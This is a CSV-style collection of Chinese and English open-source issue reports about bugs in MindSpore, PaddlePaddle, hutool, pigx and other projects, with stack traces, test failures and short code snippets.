"系统环境为 Pixel5-API29 安卓 10, 打开官网一直报错","系统环境为 Pixel5-API29 安卓 10 原因 Logical nullish assignment (x ??= y) 支持的浏览器: , Nullish coalescing operator (??) 支持的浏览器: , https://www.cnblogs.com/densen2014/p/16792910.html 涉及文件 \modules\download.js \modules\select.js Web Assembly   <code>: Chrome for Android 106 (2020-9-28) iOS safari 14 (2021-8-16) Chrome for Android 106 (2020-9-28) iOS safari 13 (2019-9-19)"
[CT][MS][unsortedsegmentprod ]RuntimeError: Op select ret item is null During Backend Execution of the unsortedsegmentprod Operator ascend,"unsortedsegmentprod算子ascend后端执行报错RuntimeError: Op select ret item is null / 硬件环境: /device ascend : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph test_p_unsortedsegmentprod_1d_int16 test_p_unsortedsegmentprod_1d_uint32 test_p_unsortedsegmentprod_2d_uint64 test_p_unsortedsegmentprod_4d_uint16 pytest -s test_unsortedsegmentprod.py::test_p_unsortedsegmentprod_1d_int16, pytest -s test_unsortedsegmentprod.py::test_p_unsortedsegmentprod_1d_uint32, pytest -s test_unsortedsegmentprod.py::test_p_unsortedsegmentprod_2d_uint64, pytest -s test_unsortedsegmentprod.py::test_p_unsortedsegmentprod_4d_uint16, pass   <code>: _____________________ test_p_unsortedsegmentprod_1d_int16 ______________________ @Author('zwx1123256') @Level2 @SKIP_ENV_GPU(reason='issue=I1V9QY,莽庐聴氓颅聬氓聫聧氓聬聭莽聰篓氓聢掳莽職聞Select莽庐聴氓颅聬茂录聦盲赂聧忙聰炉忙聦聛int16莽卤禄氓聻聥') def test_p_unsortedsegmentprod_1d_int16(): input_list = [] input_list.append(Tensor(np.random.randn(4).astype(np.int16), dtype=mstype.int16)) input_list.append(Tensor([0, 0, 1, 2], dtype=mstype.int32)) input_list.append(3) fact = UnsortedSegmentProdMock(inputs=input_list) &gt; fact.forward_cmp() ../operations/test_unsortedsegmentprod.py:743: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/unsortedsegmentprod_ops.py:87: in forward_cmp out_mindspore = self.forward_mindspore_impl() ../share/ops/primitive/unsortedsegmentprod_ops.py:44: in forward_mindspore_impl out = net(inputa, segments) ../share/utils.py:199: in __call__ out = super().__call__(*args, **kwargs) /root/archiconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:627: in __call__ out = self.compile_and_run(*args) /root/archiconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:943: in compile_and_run self.compile(*inputs) /root/archiconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:917: in compile jit_config_dict=self._jit_config_dict) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.common.api._CellGraphExecutor object at 0xffff525fc7d0&gt; obj = WrapOp&lt;&gt;, phase = 'train.1669345793794874112.281468406720080.34' do_convert = True, jit_config_dict = {} args = (Tensor(shape=[4], dtype=Int16, value= [0, 0, 0, 0]), Tensor(shape=[4], dtype=Int32, value= [0, 0, 1, 2])) def compile(self, obj, *args, phase='predict', do_convert=True, jit_config_dict=None): """""" Compiles graph. Args: obj (Function/Cell): The function or cell instance need compile. args (tuple): Function or cell input arguments. phase (str): The name of compile phase. Default: 'predict'. do_convert (bool): When set to True, convert ME graph to GE graph after compiling graph. jit_config_dict (dict): Jit config for compile. Default: None. Return: Str, the full phase of the cell. Bool, if the graph has been compiled before, return False, else return True. """""" obj.__parse_method__ = 'construct' if not hasattr(obj, obj.__parse_method__): raise AttributeError( 'The class {} dose not have method {}'.format(obj.__class__.__name__, obj.__parse_method__)) args_list = args self.enable_tuple_broaden = False if hasattr(obj, ""enable_tuple_broaden""): self.enable_tuple_broaden = obj.enable_tuple_broaden self._graph_executor.set_enable_tuple_broaden(self.enable_tuple_broaden) key = self._graph_executor.generate_arguments_key(obj, args_list, self.enable_tuple_broaden) obj.arguments_key = str(key) phase = phase + '.' + str(obj.create_time) + '.' + str(id(obj)) + '.' + obj.arguments_key if phase in obj.compile_cache and self.has_compiled(phase): logger.debug(""%r graph has existed."", phase) return phase, False obj.check_names() _check_full_batch() self._set_dataset_mode(args_list) self._set_compile_cache_dep_files(phase) enable_ge = context.get_context(""enable_ge"") self._graph_executor.set_weights_values(obj.parameters_dict()) if jit_config_dict: self._graph_executor.set_jit_config(jit_config_dict) &gt; result = self._graph_executor.compile(obj, args_list, phase, self._use_vm_mode()) E RuntimeError: Op select ret item is null. E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/ccsrc/kernel/oplib/oplib.cc:35 SplitStrToVec /root/archiconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/common/api.py:1320: RuntimeError"
PostBizImpl post方法无法调用FeedsEventPlugin的onEvent方法,"@加贝 @CacheEvict(value = ""postsCaches"", allEntries = true) public void post(Post post) { long id = postService.post(post); 中event类型为FeedsEvent时applicationContext.publishEvent(event)后，只会调用FeedsEventHandler的方法不会去调用FeedsEventPlugin的onEvent方法，event类型为ApplicationEvent才会调用插件中的方法   <code>: FeedsEvent event = new FeedsEvent(""feedsEvent""); event.setPostId(id); event.setAuthorId(post.getAuthorId()); event.setPrivacy(post.getPrivacy()); applicationContext.publishEvent(event); }"
在iframe里给父级加样式，排版错误,"父： 子：   <code>: &lt;div id=""demo1"" style=""width: 300px; margin: 20px;"" value=""1""&gt;&lt;/div&gt; &lt;iframe id=""mainiframe"" frameborder=""0"" width=""100%"" height=""100%"" scrolling=""no"" src=""xselect.html""&gt;&lt;/iframe&gt; layui.config({ base: 'layui/layui_exts/xmSelect/' }).extend({ xmSelect: 'xm-select' }).use(['xmSelect'], function(){ var xmSelect = layui.xmSelect; //渲染多选 var demo1 = xmSelect.render({ el: window.parent.document.getElementById(""demo1""), , data: [ {name: '策略1', value: 1}, {name: '策略2', value: 2}, {name: '策略3', value: 3}, ], }) })"
pigx-gateway中FeignClient 调用报错,"pigx版本: 2.7.0 操作系统:windows 7 是否修改包名: 没有 1、在模块pigx-upms-biz下com.pig4cloud.pigx.admin.service.SysOauthClientDetailsService增加根据客户端ID查询客户端详情的接口getClinetDetailByClientId。 2、在模块pigx-upms-biz下com.pig4cloud.pigx.admin.service.impl.SysOauthClientDetailsServiceImpl实现getClinetDetailByClientId。 3、在模块pigx-upms-biz下com.pig4cloud.pigx.admin.controller.OauthClientDetailsController中间增加getClinetDetailByClientId的查询入口。 4、在包com.pig4cloud.pigx.admin.api.feign下创建feignClient：RemoteClientService，以根据客户端ID查询客户端详情信息。 5、在模块pigx-gateway模块下pom.xml引入pigx-upms-api依赖。 6、在PigxGatewayApplication中增加注解指定扫描范围@EnableFeignClients(""com.pig4cloud.pigx.admin.api"")。 7、在ValidateCodeGatewayFilter调用RemoteClientService获取客户端信息，报错：Caused by: feign.FeignException: status 401 reading RemoteClientService#getClinetDetailByClientId(String,String)。   <code>: Caused by: feign.FeignException: status 401 reading RemoteClientService#getClinetDetailByClientId(String,String)"
pagination函数提供$url参数后，合成网址错误!,"href=""?这里多了一个问号？!   <code>: if ($url) { $pdata['faa'] = 'href=""?' . str_replace('*', $pdata['findex'], $url) . '""'; $pdata['paa'] = 'href=""?' . str_replace('*', $pdata['pindex'], $url) . '""'; $pdata['naa'] = 'href=""?' . str_replace('*', $pdata['nindex'], $url) . '""'; $pdata['laa'] = 'href=""?' . str_replace('*', $pdata['lindex'], $url) . '""'; } else {"
Ngraph compile error in debug mode,"In nighly debug job, there is ngraph compiler error. http://ci.paddlepaddle.org/viewLog.html?buildId=46821&amp;tab=buildLog&amp;buildTypeId=Paddle_CiDebug&amp;logTab=tree&amp;filter=all&amp;_focus=18816   <code>: [16:00:27][Step 1/1] Traceback (most recent call last): [16:00:27][Step 1/1] File ""setup.py"", line 207, in &lt;module&gt; [16:00:27][Step 1/1] shutil.copy('/paddle/build/third_party/install/ngraph/lib/libtbb.so.2', libs_path) [16:00:27][Step 1/1] File ""/usr/lib/python2.7/shutil.py"", line 119, in copy [16:00:27][Step 1/1] copyfile(src, dst) [16:00:27][Step 1/1] File ""/usr/lib/python2.7/shutil.py"", line 82, in copyfile [16:00:27][Step 1/1] with open(src, 'rb') as fsrc: [16:00:27][Step 1/1] IOError: [Errno 2] No such file or directory: '/paddle/build/third_party/install/ngraph/lib/libtbb.so.2' [16:00:27][Step 1/1] python/CMakeFiles/paddle_python.dir/build.make:565: recipe for target 'python/build/.timestamp' failed [16:00:27][Step 1/1] CMakeFiles/Makefile2:86866: recipe for target 'python/CMakeFiles/paddle_python.dir/all' failed [16:00:27][Step 1/1] make[2]: *** [python/build/.timestamp] Error 1 [16:00:27][Step 1/1] make[1]: *** [python/CMakeFiles/paddle_python.dir/all] Error 2 [16:00:27][Step 1/1] make[1]: *** Waiting for unfinished jobs...."
建议表格中列标题支持换行显示,我是在head中添加样式实现的，如果基础参数能控制或直接换行显示就更好了。   <code>: &lt;style&gt; th .layui-table-cell { line-height: 120% !important; text-align: center; } th .layui-table-cell { height: auto !important; white-space: normal !important; word-wrap: break-word; } .layui-table-fixed tr .layui-table-col-special { height: 47.8px; } &lt;/style&gt;
paddle::inference::Load() interface has changed,"First parameter has changed to framework::Executor* executor. Now it has signature: Callers in paddle/fluid/inference/tests/test_multi_thread_helper.h shall be updated accordingly.   <code>: std::unique_ptr&lt;framework::ProgramDesc&gt; Load(framework::Executor* executor, framework::Scope* scope, const std::string&amp; dirname); std::unique_ptr&lt;framework::ProgramDesc&gt; Load(framework::Executor* executor, framework::Scope* scope, const std::string&amp; prog_filename, const std::string&amp; param_filename); // 2. Initialize the inference_program and load parameters std::unique_ptr&lt;paddle::framework::ProgramDesc&gt; inference_program = paddle::inference::Load(executor, *scope, dirname);"
`elementwise_add_grad` should be optimized ,should be optimized to avoid the effect of eigen.   <code>: elementwise_add_grad -------------------------&gt; Profiling Report &lt;------------------------- Place: CUDA Time unit: ms Sorted by total time in descending order in the same thread Event Calls Total Min. Max. Ave. thread0::elementwise_add_grad 176 7243.75 0.04736 168.678 41.1577 thread0::warpctc 16 7202.06 1.28614 7180.67 450.129 thread0::conv2d_grad 128 752.047 2.50992 17.4375 5.87536 thread0::conv2d 256 491.638 1.08138 4.74362 1.92046 thread0::batch_norm 256 301.695 0.076608 5.48499 1.17849 thread0::gru 64 299.851 4.54563 5.25917 4.68517 thread0::batch_norm_grad 128 287.493 0.343488 6.05075 2.24604 thread0::gru_grad 32 192.225 5.83638 6.24419 6.00702 thread0::elementwise_add 576 89.5377 0.009984 0.579264 0.155447 thread0::relu 256 57.8738 0.062848 0.482432 0.22607 thread0::mul 128 52.3439 0.191296 0.6896 0.408937 thread0::relu_grad 128 40.9168 0.086784 0.685856 0.319662 thread0::pool2d_grad 64 30.8992 0.135456 0.989888 0.4828 thread0::pool2d 128 24.5201 0.057664 0.394848 0.191563 thread0::mul_grad 64 21.6162 0.043584 0.628768 0.337753 thread0::momentum 688 17.9174 0.008928 0.317664 0.0260427 thread0::im2sequence 32 16.2841 0.504608 0.515488 0.508877 thread0::ctc_align 32 16.0577 0.469184 0.665344 0.501804 thread0::warpctc_grad 16 15.68 0.943936 1.09715 0.98 thread0::top_k 32 9.99485 0.218304 1.05782 0.312339 thread0::im2sequence_grad 16 8.83674 0.54448 0.565408 0.552296 thread0::edit_distance 32 8.6968 0.244896 0.601024 0.271775 thread0::sum 112 8.36666 0.019328 0.235168 0.0747023 thread0::scale 256 7.41229 0.00928 0.1416 0.0289542 thread0::clip 224 6.79677 0.009984 0.141408 0.0303427 thread0::cast 36 6.31331 0.048736 0.229376 0.17537 thread0::feed 64 4.81792 0.048608 0.194784 0.07528 thread0::fill_zeros_like 512 4.63562 0.00736 0.010624 0.00905394 thread0::fetch 36 1.31088 0.024704 0.075424 0.0364133 thread0::reduce_sum 32 1.00794 0.026752 0.078976 0.031498 thread0::fill_constant 24 0.594816 0.017376 0.054784 0.024784 thread0::mean 16 0.541664 0.027392 0.0888 0.033854 thread0::elementwise_div 4 0.285696 0.042336 0.099936 0.071424
请问上传文件的时候，BOUNDARY可以允许修改吗？,hutool-all:5.7.12 看了下源码： 最近在做爬虫自动化，在上传文件的时候，发现，这个BOUNDARY是固定含有hutool字符，这样会被对方识别出错。请问有办法修改吗？   <code>: /** * 获取Multipart的Content-Type类型 * * @return Multipart的Content-Type类型 */ public static String getContentType(){ return CONTENT_TYPE_MULTIPART_PREFIX + BOUNDARY; }
【众智】【计算-AICPU开发】ResizeNearestNeighborV2,AICPU算子开发 使用最近邻插值调整images大小为指定size x size align_corners bool 属性 False half_pixel_centers bool 属性 False data_format string 属性 NHWC y 对应底层算子 对应底层AI CPU算子ResizeNearestNeighborV2 https://www.tensorflow.org/api_docs/python/tf/raw_ops/ResizeNearestNeighbor 3. 异常处理 4. 算子反向 接入反向算子ResizeNearestNeighborV2Grad   <code>: class ResizeNearestNeighborV2(Primitive):
[ST][MS/modelzoo][scripts][gru/unet3d]单卡脚本写死了device_id,文档链接： https://e.gitee.com/mind_spore/repos/mindspore/models/blob/master/official/nlp/GRU/scripts/run_standalone_train_ascend.sh https://e.gitee.com/mind_spore/repos/mindspore/models/blob/master/official/nlp/GRU/scripts/run_standalone_train_gpu.sh https://e.gitee.com/mind_spore/repos/mindspore/models/blob/master/official/cv/Unet3d/scripts/run_standalone_train.sh 脚本应使用从外部传参的device_id / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph 不涉及 脚本应使用从外部传参的device_id 脚本应使用从外部传参的device_id 走给 安正气   <code>: export DEVICE_NUM=1 export DEVICE_ID=0 export RANK_ID=0 export RANK_SIZE=1
"[CT][MS][GPU]Output_idx 0 of node ValueNode<Tensor> Tensor(shape=[0], dtype=Int64, value=) output addr is not exist.","Output_idx 0 of node ValueNode Tensor(shape=[0], dtype=Int64, value=) output addr is not exist. / 硬件环境: /device GPU : -- MindSpore version :master-45367 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph pytest -s interface/data_format/test_net_3d.py::test_net_3d_ops_conv3dtranspose_bn3d_relu case pass   <code>: def test_net_3d_ops_conv3dtranspose_bn3d_relu(): fact = Ops3DNetTrainFactory(infer_shape=(32, 10, 64, 64), mul_w=(32, 10, 65, 65, 65)) ms_convtranspose_bn = Conv3DTransposeBN3DNet( in_channel=fact.c, out_channel=fact.c, kernel_size=(2, 2, 2), num_features=fact.c) ms_3d = NestReLUNet(ms_convtranspose_bn) torch_convtranspose_bn = Conv3DTransposeBN3DTorchNet(in_channel=fact.c, out_channel=fact.c, kernel_size=(2, 2, 2), num_features=fact.c, weight_np=fact.net_weight_np) torch_3d = NestReLUTorchNet(torch_convtranspose_bn) &gt; fact.compare_train_infer(2, ms_3d, torch_3d) &gt; result = self._graph_executor.compile(obj, args_list, phase, self._use_vm_mode()) E RuntimeError: Output_idx 0 of node ValueNode&lt;Tensor&gt; Tensor(shape=[0], dtype=Int64, value=) output addr is not exist. E E ---------------------------------------------------- E - The Function Call Stack: (For framework developers) E ---------------------------------------------------- E In file /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/loss/loss.py:1565/ loss = self.bce_with_logits_loss(logits, labels, weight, pos_weight)/ E In file /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/wrap/cell_wrapper.py:118/ return self._loss_fn(out, label)/ E In file /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/wrap/cell_wrapper.py:382/ loss = self.network(*inputs)/ E In file /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/train/dataset_helper.py:101/ return self.network(*outputs)/ E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/ccsrc/backend/common/session/anf_runtime_algorithm.cc:531 GetMutableOutputAddr /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py:1320: RuntimeError"
sql server 标识符引用符号HTML转义,"sql server 标识符引用符号HTML转义成 datagear-web\src\main\resources\org\datagear\web\templates\data\data_grid.ftl 第95行改为   <code>: ""\"""" ""\&amp;quot;"" ""${sqlIdentifierQuote?js_string}"" ""${sqlIdentifierQuote?js_string?no_esc}"""
UnicodeUtil.toString(String unicode) 死循环问题,"传入不正确的unicode串 会死循环 java.lang.OutOfMemoryError: Java heap space   <code>: String str = ""aaa\\u111""; String res = UnicodeUtil.toString(str);"
连接数据库失败,2.1.3 PDMan 连接数据库显示以下信息   <code>: null java.lang.NullPointerException at java.lang.Class.forName0(Native Method) at java.lang.Class.forName(Unknown Source) at group.rober.pdman.kit.JdbcKit.getConnection(JdbcKit.java:27) at group.rober.pdman.command.impl.ExecSQLCommand.exec(ExecSQLCommand.java:33) at group.rober.pdman.command.impl.DBSyncCommand.exec(DBSyncCommand.java:20) at group.rober.pdman.command.impl.DBSyncCommand.exec(DBSyncCommand.java:13) at group.rober.pdman.dbconnector.Application.main(Application.java:75)
"Questions regarding ""rank_cost""","I use the provided loss function for my training, with . In the end of each pass, the log will print the info of . At the end of Pass-00000, the log info is as follows: The sum of the number of samples in each trainer (4088+2378+4179+2287+4164+2302+4171+2296) is just equal to the number of training samples (25856), which is correct. However, at the end of Pass-00001, the log is: The sum of the number of samples in each trainer (5097+1731+5152+1677+5248+1580+5206+1624) does not equal to 25865, but is 27315, the sum of training samples and testing samples (25865+1450). Also in the subsequent pass, this sum number is always 27315, rather than 25865. It seems to count the pos/neg ratio using the training samples and test samples together, which is not appropriate in my opinion. Then how could I get the pos/neg ratio of training and testing samples separately? Thanks~   <code>: rank_cost trainer_count = 4 pos/neg 13:14:26.505049 9642 CostLayer.cpp:283] calc pos/neg: 1.71909 pos= 4088 neg= 2378 13:14:26.505116 9642 CostLayer.cpp:283] calc pos/neg: 1.82728 pos= 4179 neg= 2287 13:14:26.505129 9642 CostLayer.cpp:283] calc pos/neg: 1.80886 pos= 4164 neg= 2302 13:14:26.505141 9642 CostLayer.cpp:283] calc pos/neg: 1.81664 pos= 4171 neg= 2296 13:14:26.505161 9642 TrainerInternal.cpp:179] Pass=0 Batch=203 samples=25865 AvgCost=0.629527 Eval: 13:14:27.374795 9642 Tester.cpp:111] Test samples=1450 cost=0.459305 Eval: 13:14:27.374897 9642 GradientMachine.cpp:112] Saving parameters to ./models/pass-00000 13:14:42.750605 9642 CostLayer.cpp:283] calc pos/neg: 2.94454 pos= 5097 neg= 1731 13:14:42.750634 9642 CostLayer.cpp:283] calc pos/neg: 3.07215 pos= 5152 neg= 1677 13:14:42.750646 9642 CostLayer.cpp:283] calc pos/neg: 3.32152 pos= 5248 neg= 1580 13:14:42.750658 9642 CostLayer.cpp:283] calc pos/neg: 3.20567 pos= 5206 neg= 1624 13:14:42.750675 9642 TrainerInternal.cpp:179] Pass=1 Batch=203 samples=25865 AvgCost=0.525822 Eval: 13:14:43.613981 9642 Tester.cpp:111] Test samples=1450 cost=0.404172 Eval: 13:14:43.614042 9642 GradientMachine.cpp:112] Saving parameters to ./models/pass-00001"
调整sentinel 初始化相关配置,"pigx版本: 3.7 是否修改包名: 否 默认情况下，sentinel 是懒加载的 会导致一下情况 在无流量的请求初始的时候， 返回down , 状态显示红色 的服务为空 修改点:   <code>: actuator/health spring boot admin sentinel dashboard application-dev。yml spring: sentinel: filter: url-patterns: /** #此项为spring cloud bug ，已提 pr eager: true"
"[CT][MS]not get return of numpy method, fail in graph mode",": /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : python test_fall_back_mat.py TypeError: module, class, method, function, traceback, frame, or code object was expected, got builtin_function_or_method pass   <code>: from mindspore.common import Tensor from mindspore.nn import Cell from mindspore import context import numpy as np import mindspore.ops.operations as P #context.set_context(mode=context.PYNATIVE_MODE) class Net(Cell): def __init__(self): super().__init__() self.mul = P.Mul() def construct(self, x): a = np.array([[1, 2], [3, 4]]) b = a.T np.vdot(a, b) # the result is unused #c = np.vdot(a, b) d = np.linalg.norm(a) out = Tensor(d) return out net = Net() x = Tensor([2, 2, 2, 2]) out = net(x) print(out)"
capi v2 多线程使用问题,"线上多线程共用一个模型预测在成功预测完一些样本后会报错。 单机测试capi，在每个线程中初始化单独的模型可以顺利预测，但只初始化一个模型，通过struct传入thread共用会出现预测出一些结果后报错，不知原因。所有本地使用的样本都一样，输入格式应该没问题   <code>: enter thread1 this is thread1, thread id is 3907217152 enter thread2 this is thread2, thread id is 3915609856 thread1 model predict successfully! thread2 model predict successfully! thread1 model predict successfully! thread2 model predict successfully! thread1 model predict successfully! thread2 model predict successfully! thread1 model predict successfully! thread2 model predict successfully! thread1 model predict successfully! thread2 model predict successfully! thread1 model predict successfully! thread2 model predict successfully! thread1 model predict successfully! thread2 model predict successfully! thread1 model predict successfully! thread2 model predict successfully! thread1 model predict successfully! thread2 model predict successfully! thread1 model predict successfully! F0412 10:25:28.660399 477 SequencePoolLayer.cpp:59] Check failed: starts-&gt;getData()[newBatchSize_] == input.getBatchSize() (32745 vs. 43) *** Check failure stack trace: *** thread1 model predict successfully! thread1 model predict successfully! @ 0x7fe9ed83e76d google::LogMessage::Fail() @ 0x7fe9ed84221c google::LogMessage::SendToLog() thread1 model predict successfully! @ 0x7fe9ed83e293 google::LogMessage::Flush() @ 0x7fe9ed84372e google::LogMessageFatal::~LogMessageFatal() thread1 model predict successfully! @ 0x7fe9ed88c138 paddle::SequencePoolLayer::forward() @ 0x7fe9ed8ddb7d paddle::MaxLayer::forward() @ 0x7fe9ed9a24bd paddle::NeuralNetwork::forward() @ 0x7fe9ed83a676 paddle_gradient_machine_forward thread1 model predict successfully! @ 0x4031b3 TrafficModel::traffic_predict() thread1 model predict successfully! @ 0x4041d0 TrafficModel::predict() thread1 model predict successfully! @ 0x405ac0 thread2() @ 0x7fe9ec9b71c3 start_thread @ 0x7fe9eccb412d __clone @ (nil) (unknown) Aborted"
cn.hutool.core.collection.FilterIter当参数filter为空时存在问题,"JDK版本： jdk1.8.311 hutool版本： 5.8.5 根据注释,当filter为空null表示不进行过滤.但是源码分析当filter为null时永远无法获取到元素 源码如下 需要修改源码逻辑   <code>: private boolean setNextObject() { while (iterator.hasNext()) { final E object = iterator.next(); if (null != filter &amp;&amp; filter.accept(object)) { nextObject = object; nextObjectSet = true; return true; } } return false; } if (null == filter || filter.accept(object)) { Iterator&lt;String&gt; it = ListUtil.of(""1"", ""2"").iterator(); FilterIter&lt;String&gt; filterIter = new FilterIter&lt;&gt;(it, null); while (filterIter.hasNext()) { System.out.println(filterIter.next()); }"
差异日志报错，Db子对象不支持租户方法,修改为这样可以正常插入数据库，但是对于租户分库模式没有测试   <code>: await db.Insertable(LogDiff).ExecuteCommandAsync();
JSONGetter注释问题,"JDK版本： openjdk_8_201 hutool版本： 5.7.12   <code>: /** * 获得JSONObject对象&lt;br&gt; * 如果值为其它类型对象，尝试转换为{@link JSONObject}返回，否则抛出异常 * * @param key KEY * @return JSONArray对象，如果值为null或者非JSONObject类型，返回null */ default JSONObject getJSONObject(K key) { final Object object = this.getObj(key); if (null == object) { return null; } if (object instanceof JSON) { return (JSONObject) object; } return new JSONObject(object, getConfig()); }"
本地redis可以编辑分类，LinuxRedis编辑分类获取不到类型信息,Debug: 线上Redis和MySQL环境： 3. 您希望得到什么结果？ 为什么会这样？该怎么解决？   <code>: 测试本机Redis和LinuxRedis，清空Redis在测试 还是一样 本地Redis可以获取到信息 LinuxRedis获取不到信息
springboot集成forest提示“is not eligible for getting processed by all BeanPostProcessors”,"Forest: 1.5.1 Backend: okhttp/3.14.9 spring boot: 2.3.2 该问题是如何引起的？ 启动时forest的几个类提示""is not eligible for getting processed by all BeanPostProcessors""，自定义的BeanPostProcessor在使用bean时的依赖是不是应调整。 每次启动服务都会出现 报错信息/完整请求日志（如果没有请求日志请把开关打开） 接口定义（必要时请提供）   <code>: [2021-06-16 11:49:25,351][INFO ]Bean 'com.dtflys.forest.springboot.ForestAutoConfiguration' of type [com.dtflys.forest.springboot.ForestAutoConfiguration$$EnhancerBySpringCGLIB$$6642e6d0] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying)(org.springframework.context.support.PostProcessorRegistrationDelegate$BeanPostProcessorChecker:335) [2021-06-16 11:49:25,411][INFO ]Bean 'forestConfigurationProperties' of type [com.dtflys.forest.springboot.properties.ForestConfigurationProperties] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying)(org.springframework.context.support.PostProcessorRegistrationDelegate$BeanPostProcessorChecker:335) [2021-06-16 11:49:25,542][INFO ]Bean '(inner bean)#63475ace' of type [com.dtflys.forest.interceptor.SpringInterceptorFactory] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying)(org.springframework.context.support.PostProcessorRegistrationDelegate$BeanPostProcessorChecker:335) [2021-06-16 11:49:25,545][INFO ]Bean 'forestConfiguration' of type [com.dtflys.forest.config.ForestConfiguration] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying)(org.springframework.context.support.PostProcessorRegistrationDelegate$BeanPostProcessorChecker:335)"
启动时异常，日志如下,请问是否jar包问题？反复删除再导入都没有效果   <code>: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'methodValidationPostProcessor' defined in class path resource [org/springframework/boot/autoconfigure/validation/ValidationAutoConfiguration.class]: Unsatisfied dependency expressed through method 'methodValidationPostProcessor' parameter 0; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'shiroFilter' defined in class path resource [com/xnx3/j2ee/system/ShiroConfiguration.class]: Unsatisfied dependency expressed through method 'shiroFilter' parameter 0; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'securityManager' defined in class path resource [com/xnx3/j2ee/system/ShiroConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.apache.shiro.mgt.SecurityManager]: Factory method 'securityManager' threw exception; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'sessionManager' defined in class path resource [com/xnx3/j2ee/system/ShiroConfiguration.class]: Post-processing of merged bean definition failed; nested exception is java.lang.IllegalStateException: Failed to introspect Class [org.apache.shiro.web.session.mgt.DefaultWebSessionManager] from ClassLoader [sun.misc.Launcher$AppClassLoader@14dad5dc]
The type is wrong for row_conv layer in config_parse.py,The type in config_parse.py for should be .   <code>: row_conv row_conv
增加项目模板功能,增加项目模板功能 安装项目模板 创建工程 创建工程后在当前文件夹内会生成 目录，打开工程直接 即可   <code>: dotnet new -i Bootstrap.Blazor.Templates::* dotnet new bootstrapblazorserver BootstrapBlazorServer F5
Failure obtaining db row lock: Table '*.QRTZ_LOCKS' doesn't exist,本地MYSQL数据运行无误 腾讯云数据库就报这个错 版本都是5/7的   <code>: Caused by: org.quartz.impl.jdbcjobstore.LockException: Failure obtaining db row lock: Table '*.QRTZ_LOCKS' doesn't exist at org.quartz.impl.jdbcjobstore.StdRowLockSemaphore.executeSQL(StdRowLockSemaphore.java:184) at org.quartz.impl.jdbcjobstore.DBSemaphore.obtainLock(DBSemaphore.java:113) at org.quartz.impl.jdbcjobstore.JobStoreCMT.executeInLock(JobStoreCMT.java:238) at org.quartz.impl.jdbcjobstore.JobStoreSupport.clearAllSchedulingData(JobStoreSupport.java:2002) at org.quartz.core.QuartzScheduler.clear(QuartzScheduler.java:1547) at org.quartz.impl.StdScheduler.clear(StdScheduler.java:239) at com.ruoyi.quartz.service.impl.SysJobServiceImpl.init(SysJobServiceImpl.java:42) at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.base/java.lang.reflect.Method.invoke(Method.java:567) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor$LifecycleElement.invoke(InitDestroyAnnotationBeanPostProcessor.java:363) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor$LifecycleMetadata.invokeInitMethods(InitDestroyAnnotationBeanPostProcessor.java:307) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor.postProcessBeforeInitialization(InitDestroyAnnotationBeanPostProcessor.java:136)
注意到支持json作为配置文件，建议可以考虑使用Hocon作为json的上位替代品,"背景： 基于QLExpress,springEL和hocon实现了简易的规则引擎。直到我发现这个项目，目前还在学习，准备切换过来，结合我之前的一些经验，hocon是比较适合用于规则引擎脚本的编写的，完全是json格式的上位替代品。 不需要写很多引号 参数定义和注入， 写转义字符，如""\n""来表示换行符 脚本定义，用三个引号，来不转义字符，json写脚本感觉应该基本没法搞定 可以写注释等一系列优点。typasafe.config 这里可以分享一下我调用飞书的脚本引擎实现，command就是一个QLExpression. setting是特殊字符注入到context中：   <code>: setting = { 换行 = ""\n"" } // command = """""" function replace(String a){ if(a == null){ return a; } else { return org.apache.commons.lang3.StringUtils.replace(a, 换行, """"); } }; content = replace(content); """""" // webhook 定义 name = ""feishu-webhook"" post = true url = ""https://open.feishu.cn/open-apis/bot/v2/hook/xxxxxx"" body = { ""msg_type"": ""text"", ""content"": { ""text"": ""#{content}@#{receiver}"" } }"
